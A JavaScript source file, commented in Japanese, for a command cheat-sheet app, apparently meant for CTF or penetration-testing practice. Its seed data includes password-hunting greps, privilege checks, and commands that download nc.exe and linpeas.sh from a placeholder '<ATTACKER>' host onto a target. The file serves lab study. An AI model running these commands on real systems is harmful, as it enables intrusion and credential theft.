/* ═══════════════════════════════════════════════════════
   go2 cheatsheet — commands.js  (便利コマンド集)
   Data: data.commands[]
   command { id, title, category, desc, tags[],
             variants[{ id, os, cmd, note }], ts }

   「同じ目的」を1項目にまとめ、OS別（Windows / Linux 等）の
   コマンドを variants として並べて対応表のように引く。

   app.js の共通関数（openModal/toast/esc/escAttr/uid/copyCell/
   renderMd/emptyState/val）と定数（COMMAND_CATEGORIES/COMMAND_OS）を再利用。
════════════════════════════════════════════════════════ */

function cmdOsMeta(os) {
  return (typeof COMMAND_OS !== "undefined" && COMMAND_OS[os]) || { label: os, color: "#7d9186" };
}
/* データ中に登場するOSの一覧（フィルタタブ用） */
function cmdAllOs() {
  const s = new Set();
  data.commands.forEach(c => (c.variants||[]).forEach(v => v.os && s.add(v.os)));
  return [...s];
}

function renderCommandsNav() {
  const nav = document.getElementById("navList");
  if (!nav) return;
  nav.innerHTML = `
    <button class="nav-item active" onclick="setMode('commands')">
      <span class="material-symbols-rounded nav-icon">terminal</span>
      <span class="nav-label">コマンド</span>
      <span class="nav-count">${data.commands.length}</span>
    </button>`;
}

/* ═══════════════════════════════════════════════════
   一覧（OSタブ＋カテゴリchip＋カード）
════════════════════════════════════════════════════ */
function renderCommands() {
  commandsSeedIfEmpty();
  renderCommandsNav();
  const main = document.getElementById("main");

  // カテゴリで絞り込み
  let list = data.commands.slice();
  if (cmdCatFilter) list = list.filter(c => c.category === cmdCatFilter);
  // OSで絞り込み（そのOSのvariantを1つ以上持つ項目だけ）
  if (cmdOsFilter !== "all") list = list.filter(c => (c.variants||[]).some(v => v.os === cmdOsFilter));

  // OSタブ
  const oses = cmdAllOs();
  const osTab = (id, label) => {
    const n = id === "all"
      ? data.commands.length
      : data.commands.filter(c => (c.variants||[]).some(v => v.os === id)).length;
    return `<button class="tool-cert-tab ${cmdOsFilter===id?'on':''}" onclick="cmdSetOs('${escAttr(id)}')">${esc(label)} <span class="badge">${n}</span></button>`;
  };
  const osTabs = osTab("all", "すべて") + oses.map(o => osTab(o, o)).join("");

  // カテゴリchips（現在のOSフィルタ内に存在するカテゴリだけ）
  const osScope = cmdOsFilter === "all"
    ? data.commands
    : data.commands.filter(c => (c.variants||[]).some(v => v.os === cmdOsFilter));
  const catsInScope = [...new Set(osScope.map(c => c.category))];
  const catList = (typeof COMMAND_CATEGORIES !== "undefined" ? COMMAND_CATEGORIES : [])
    .filter(c => catsInScope.includes(c));
  // 定義外カテゴリも拾う
  catsInScope.forEach(c => { if (!catList.includes(c)) catList.push(c); });
  const catChips = catList.map(c =>
    `<button class="th-chip ${cmdCatFilter===c?'on':''}" onclick="cmdSetCat('${escAttr(c)}')">${esc(c)}</button>`).join("");

  main.innerHTML = `
    <div class="s-head">
      <h1>コマンド</h1>
      <span class="th-count">${list.length} 項目${cmdOsFilter!=="all"?` · ${esc(cmdOsFilter)}`:""}</span>
      <button class="th-add" onclick="cmdAdd()"><span class="material-symbols-rounded">add</span>コマンドを追加</button>
    </div>
    <div class="tool-cert-tabs">${osTabs}</div>
    <div class="th-filters">
      <button class="th-chip ${!cmdCatFilter?'on':''}" onclick="cmdSetCat(null)">すべて</button>
      ${catChips}
    </div>
    ${list.length ? `<div class="tool-grid" data-dnd-group="cmd-list">${list.map(renderCommandCard).join("")}</div>`
      : emptyState("terminal", data.commands.length?"該当するコマンドがありません":"コマンドがまだありません",
          data.commands.length?"フィルタを変えてください":"「コマンドを追加」で登録できます")}
  `;

  // 項目カードの並び替え（フィルタ表示中は表示分のみ入れ替え）
  registerSortable("cmd-list", ids => { reorderVisible(data.commands, ids); renderCommands(); });
  // 各項目内のOS別コマンドの並び替え
  list.forEach(c => registerSortable("cmd-vars:" + c.id, ids => { reorderVisible(c.variants, ids); renderCommands(); }));
}

function renderCommandCard(c) {
  const variants = c.variants || [];
  // OSフィルタ時は該当OSを先頭に寄せる（全variantは残す）
  const shown = cmdOsFilter === "all"
    ? variants
    : [...variants].sort((a,b) => (a.os===cmdOsFilter?0:1) - (b.os===cmdOsFilter?0:1));

  const vHtml = shown.map((v, i, arr) => {
    const osm = cmdOsMeta(v.os);
    const dim = (cmdOsFilter !== "all" && v.os !== cmdOsFilter) ? " cmd-variant-dim" : "";
    return `
      <div class="cmd-variant${dim}" data-dnd-id="${v.id}">
        <div class="cmd-variant-head">
          ${dndHandle('ドラッグでコマンドを並び替え')}<span class="cmd-os-badge" style="--os:${osm.color}">${esc(v.os)}</span>
          <span class="cmd-variant-acts">
            <button class="tool-cmd-act" onclick="cmdEditVariant('${c.id}','${v.id}')" title="編集"><span class="material-symbols-rounded" style="font-size:13px">edit</span></button>
            <button class="tool-cmd-act danger" onclick="cmdDelVariant('${c.id}','${v.id}')" title="削除"><span class="material-symbols-rounded" style="font-size:13px">delete</span></button>
          </span>
        </div>
        <pre class="tool-cmd-box">${esc(v.cmd)}<button class="tool-cmd-copy" onclick="copyCell(event, ${escAttr(JSON.stringify(v.cmd))})" title="コピー"><span class="material-symbols-rounded" style="font-size:14px">content_copy</span></button></pre>
        ${v.note?`<div class="tool-cmd-note">${esc(v.note)}</div>`:""}
      </div>`;
  }).join("") || `<div class="th-side-empty">コマンド未登録</div>`;

  const tags = (c.tags||[]).map(t=>`<span class="mini-tag">#${esc(t)}</span>`).join("");

  return `
    <div class="tool-card cmd-card" style="cursor:default" data-dnd-id="${c.id}">
      <div class="tool-card-top">
        ${dndHandle('ドラッグで項目を並び替え')}<h3 style="font-size:15.5px">${esc(c.title)}</h3>
        <span class="cmd-card-acts">
          <button class="tool-cmd-act" onclick="cmdEdit('${c.id}')" title="項目を編集"><span class="material-symbols-rounded" style="font-size:14px">edit</span></button>
          <button class="tool-cmd-act danger" onclick="cmdDel('${c.id}')" title="項目を削除"><span class="material-symbols-rounded" style="font-size:14px">delete</span></button>
        </span>
      </div>
      <div class="tool-card-foot" style="margin-top:0">
        <span class="tool-cat-tag">${esc(c.category)}</span>${tags}
      </div>
      ${c.desc?`<div class="cmd-desc">${renderMd(esc(c.desc))}</div>`:""}
      <div class="cmd-variants" data-dnd-group="cmd-vars:${c.id}">${vHtml}</div>
      <button class="tool-add-cmd" onclick="cmdAddVariant('${c.id}')"><span class="material-symbols-rounded" style="font-size:15px">add</span>OS別コマンドを追加</button>
    </div>`;
}

function cmdSetCat(c){ cmdCatFilter = (cmdCatFilter===c ? null : c); renderCommands(); }
function cmdSetOs(os){ cmdOsFilter = os; cmdCatFilter = null; renderCommands(); }

/* ═══════════════════════════════════════════════════
   CRUD — 項目
════════════════════════════════════════════════════ */
function cmdCatOptions(sel) {
  const cats = (typeof COMMAND_CATEGORIES !== "undefined" ? COMMAND_CATEGORIES : ["その他"]);
  return cats.map(c=>`<option value="${escAttr(c)}" ${sel===c?'selected':''}>${esc(c)}</option>`).join("");
}
function cmdOsPresetOptions(sel) {
  const oses = (typeof COMMAND_OS !== "undefined" ? Object.keys(COMMAND_OS) : ["Windows","Linux","共通"]);
  return oses.map(o=>`<option value="${escAttr(o)}" ${sel===o?'selected':''}>${esc(o)}</option>`).join("");
}

function cmdAdd() {
  openModal("コマンドを追加",
    `<label>目的・タイトル</label><input id="cTitle" placeholder="例: ファイルを名前で検索 (proof.txt)">
     <label>カテゴリ</label><select id="cCat">${cmdCatOptions(cmdCatFilter||"")}</select>
     <label>説明（任意・Markdown可）</label><textarea id="cDesc" placeholder="いつ使うか・注意点など"></textarea>
     <label>タグ（任意・スペース区切り）</label><input id="cTags" placeholder="proof enum flag">
     <div class="meth-import-hint" style="margin-top:10px">最初の1コマンドを登録します（あとからOS別に追加できます）</div>
     <label>OS</label><select id="cOs">${cmdOsPresetOptions("Windows")}</select>
     <label>コマンド</label><textarea id="cCmd" class="mono-input" placeholder="dir C:\\proof.txt /s /b"></textarea>
     <label>補足（任意）</label><input id="cNote" placeholder="C:ドライブ全体を再帰検索。時間がかかる場合あり">`,
    () => {
      const title = val("cTitle").trim() || "無題のコマンド";
      const variants = [];
      const firstCmd = val("cCmd").trim();
      if (firstCmd) variants.push({ id: uid(), os: val("cOs")||"共通", cmd: firstCmd, note: val("cNote") });
      data.commands.unshift({
        id: uid(),
        title,
        category: val("cCat") || "その他",
        desc: val("cDesc"),
        tags: val("cTags").split(/\s+/).filter(Boolean),
        variants,
        ts: Date.now(),
      });
      renderCommands();
      toast("✅ コマンドを追加しました");
    },
    { okText: "追加" });
}

function cmdEdit(id) {
  const c = data.commands.find(x=>x.id===id); if (!c) return;
  openModal("項目を編集",
    `<label>目的・タイトル</label><input id="cTitle" value="${esc(c.title)}">
     <label>カテゴリ</label><select id="cCat">${cmdCatOptions(c.category)}</select>
     <label>説明（Markdown可）</label><textarea id="cDesc">${esc(c.desc)}</textarea>
     <label>タグ（スペース区切り）</label><input id="cTags" value="${esc((c.tags||[]).join(' '))}">`,
    () => {
      c.title = val("cTitle").trim() || "無題のコマンド";
      c.category = val("cCat") || "その他";
      c.desc = val("cDesc");
      c.tags = val("cTags").split(/\s+/).filter(Boolean);
      renderCommands();
      toast("✅ 更新しました");
    },
    { extraBtns: [{ label:"項目を削除", cls:"btn-text btn-danger", fn:()=>{ closeModal(); cmdDel(id); } }] });
}

function cmdDel(id) {
  const c = data.commands.find(x=>x.id===id); if (!c) return;
  if (!confirm(`「${c.title}」を削除しますか？`)) return;
  data.commands = data.commands.filter(x=>x.id!==id);
  renderCommands();
  toast("🗑 削除しました");
}

/* ═══════════════════════════════════════════════════
   CRUD — OS別コマンド（variant）
════════════════════════════════════════════════════ */
function cmdAddVariant(cmdId) {
  const c = data.commands.find(x=>x.id===cmdId); if (!c) return;
  openModal("OS別コマンドを追加",
    `<label>OS</label><select id="vOs">${cmdOsPresetOptions("Linux")}</select>
     <label>コマンド</label><textarea id="vCmd" class="mono-input" placeholder="find / -name proof.txt 2>/dev/null"></textarea>
     <label>補足（任意）</label><input id="vNote" placeholder="ルートから再帰検索。エラーは捨てる">`,
    () => {
      const cmd = val("vCmd").trim();
      if (!cmd) { toast("コマンドを入力してください"); return; }
      c.variants.push({ id: uid(), os: val("vOs")||"共通", cmd, note: val("vNote") });
      renderCommands();
      toast("✅ コマンドを追加しました");
    },
    { okText: "追加" });
}

function cmdEditVariant(cmdId, vId) {
  const c = data.commands.find(x=>x.id===cmdId); if (!c) return;
  const v = (c.variants||[]).find(x=>x.id===vId); if (!v) return;
  openModal("コマンドを編集",
    `<label>OS</label><select id="vOs">${cmdOsPresetOptions(v.os)}</select>
     <label>コマンド</label><textarea id="vCmd" class="mono-input">${esc(v.cmd)}</textarea>
     <label>補足（任意）</label><input id="vNote" value="${esc(v.note)}">`,
    () => {
      v.os = val("vOs")||"共通"; v.cmd = val("vCmd"); v.note = val("vNote");
      renderCommands();
      toast("✅ 更新しました");
    },
    { extraBtns: [{ label:"削除", cls:"btn-text btn-danger", fn:()=>{ closeModal(); cmdDelVariant(cmdId, vId); } }] });
}

function cmdDelVariant(cmdId, vId) {
  const c = data.commands.find(x=>x.id===cmdId); if (!c) return;
  const v = (c.variants||[]).find(x=>x.id===vId); if (!v) return;
  if (!confirm(`${v.os} のコマンドを削除しますか？`)) return;
  c.variants = c.variants.filter(x=>x.id!==vId);
  renderCommands();
  toast("🗑 削除しました");
}

function cmdMoveVariant(cmdId, vId, dir) {
  const c = data.commands.find(x=>x.id===cmdId); if (!c) return;
  const i = c.variants.findIndex(x=>x.id===vId); if (i<0) return;
  const j = i + dir;
  if (j < 0 || j >= c.variants.length) return;
  [c.variants[i], c.variants[j]] = [c.variants[j], c.variants[i]];
  renderCommands();
}

/* ═══════════════════════════════════════════════════
   検索
════════════════════════════════════════════════════ */
function renderCommandsSearch() {
  const main = document.getElementById("main");
  const q = document.getElementById("searchInput").value.trim().toLowerCase();
  if (!q) { searchMode=false; render(); return; }
  renderCommandsNav();
  const hits = data.commands.filter(c =>
    (c.title||"").toLowerCase().includes(q) ||
    (c.desc||"").toLowerCase().includes(q) ||
    (c.category||"").toLowerCase().includes(q) ||
    (c.tags||[]).some(t=>t.toLowerCase().includes(q)) ||
    (c.variants||[]).some(v =>
      (v.cmd||"").toLowerCase().includes(q) ||
      (v.os||"").toLowerCase().includes(q) ||
      (v.note||"").toLowerCase().includes(q)));
  main.innerHTML = `
    <div class="s-head"><h1>検索: ${esc(q)}</h1><span class="th-count">${hits.length} 項目</span></div>
    ${hits.length ? `<div class="tool-grid">${hits.map(renderCommandCard).join("")}</div>`
      : emptyState("search_off","一致するコマンドがありません","別のキーワードをお試しください")}
  `;
}

/* ═══════════════════════════════════════════════════
   初期データ（OS対応表の例）
════════════════════════════════════════════════════ */
function commandsSeedIfEmpty() {
  if (data.commands.length || window.__commandsSeeded) return;
  window.__commandsSeeded = true;

  const seed = [
    {
      title: "ファイルを名前で検索 (proof.txt / local.txt)",
      category: "ファイル探索",
      desc: "フラグ (`proof.txt` / `local.txt`) を探すときの定番。**Windows はドライブ全体の検索だと時間がかかる**場合がある。",
      tags: ["proof","flag","enum"],
      variants: [
        { os: "Windows", cmd: "dir C:\\proof.txt /s /b", note: "C:ドライブ全体を再帰(/s)・パスのみ表示(/b)で検索。" },
        { os: "Windows", cmd: "where /r C:\\ proof.txt", note: "where でも再帰検索できる。" },
        { os: "Linux",   cmd: "find / -name proof.txt 2>/dev/null", note: "ルートから再帰検索。エラーは /dev/null へ捨てる。" },
      ],
    },
    {
      title: "ファイル内の文字列を検索",
      category: "ファイル探索",
      desc: "設定ファイル等から `password` などのキーワードを探す。",
      tags: ["grep","creds"],
      variants: [
        { os: "Windows", cmd: "findstr /s /i /m \"password\" C:\\*.txt C:\\*.ini C:\\*.config", note: "/s 再帰・/i 大小無視・/m 一致ファイル名のみ表示。" },
        { os: "Linux",   cmd: "grep -rin \"password\" /etc /home /var/www 2>/dev/null", note: "-r 再帰・-i 大小無視・-n 行番号。" },
      ],
    },
    {
      title: "現在のユーザー・権限を確認",
      category: "列挙 (enum)",
      desc: "シェルを取った直後にまず確認する基本。",
      tags: ["whoami","privesc"],
      variants: [
        { os: "Windows", cmd: "whoami /priv & whoami /groups", note: "保持している特権とグループを確認。SeImpersonate 等に注目。" },
        { os: "Linux",   cmd: "id; sudo -l", note: "所属グループと、パスワード無しで許可された sudo コマンドを確認。" },
      ],
    },
    {
      title: "ネットワーク接続・リッスンポートの確認",
      category: "ネットワーク",
      desc: "内部で待ち受けている（外から見えない）サービスの発見に。",
      tags: ["netstat","pivot"],
      variants: [
        { os: "Windows", cmd: "netstat -ano", note: "-a 全接続・-n 数値表示・-o PID表示。" },
        { os: "Linux",   cmd: "ss -tulpn", note: "ss が無ければ netstat -tulpn。t/u=TCP/UDP・l=LISTEN・p=プロセス・n=数値。" },
      ],
    },
    {
      title: "ファイルをダウンロードして転送",
      category: "ファイル転送",
      desc: "攻撃側 (`<ATTACKER>`) から標的へツールを送り込む。まず攻撃側で `python3 -m http.server 80` などを起動しておく。",
      tags: ["transfer","upload"],
      variants: [
        { os: "Windows", cmd: "certutil -urlcache -split -f http://<ATTACKER>/nc.exe C:\\Windows\\Temp\\nc.exe", note: "certutil はほぼ標準搭載。" },
        { os: "Windows", cmd: "powershell -c \"Invoke-WebRequest http://<ATTACKER>/nc.exe -OutFile nc.exe\"", note: "PowerShell が使える場合。" },
        { os: "Linux",   cmd: "wget http://<ATTACKER>/linpeas.sh -O /tmp/linpeas.sh", note: "wget が無ければ curl -o /tmp/linpeas.sh http://<ATTACKER>/linpeas.sh" },
      ],
    },
  ];

  seed.forEach(s => {
    data.commands.push({
      id: uid(),
      title: s.title,
      category: s.category,
      desc: s.desc || "",
      tags: s.tags || [],
      variants: (s.variants||[]).map(v => ({ id: uid(), ...v })),
      ts: Date.now(),
    });
  });
}
